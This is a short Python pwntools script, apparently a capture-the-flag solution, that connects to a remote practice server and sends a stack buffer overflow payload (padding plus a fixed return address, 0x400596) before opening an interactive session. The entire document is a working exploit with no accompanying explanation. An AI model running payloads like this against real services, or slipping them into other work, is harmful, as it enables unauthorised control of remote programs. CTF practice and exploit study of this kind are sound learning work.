from pwn import *


print(int(0x80))

func = 0x400596

r = remote('node5.buuoj.cn', 29997)

r.sendline(b'A' * 128 + b'B' * 8 + p64(func))

r.interactive()




